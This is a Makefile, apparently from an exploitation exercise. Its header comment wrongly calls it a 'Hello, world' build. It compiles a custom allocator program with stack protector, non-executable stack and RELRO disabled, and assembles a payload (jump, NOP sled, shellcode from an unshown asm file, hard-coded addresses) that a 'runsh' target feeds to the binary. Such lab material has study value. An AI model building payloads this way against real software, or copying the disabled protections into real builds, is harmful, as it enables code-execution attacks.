# Makefile exaple for building "Hello, world" C program

CC = gcc
ASM = nasm

CFLAGS = \
-Wall \
-Wextra \
-O0 \
-g \
-fno-omit-frame-pointer \
-fno-stack-protector \
-z execstack \
-z norelro

SRC = alloc_user.c alloc.c
BIN = alloc_user

.PHONY:all clean

all:$(BIN) shellcode

$(BIN):$(SRC)
	$(CC) $(CFLAGS) -o $@ $^

shellcode: pwnd.final.asm
	nasm -o pwnd.final.tmp $<; \
	perl -e 'print "\xeb\x19"' > $@; \
	(perl -e 'print "\x90"x77'; cat pwnd.final.tmp) | cat >> $@; \
	rm pwnd.final.tmp; \
	perl -e 'print "\x11"x8' >> $@; \
	perl -e 'print "\x10\xa0\x04\x08"' >> $@; \
	perl -e 'print "\x20\x9d\x04\x08"' >> $@

runsh: $(BIN) shellcode
	./$(BIN) "`cat shellcode`"


clean:
	rm $(BIN)
	rm shellcode

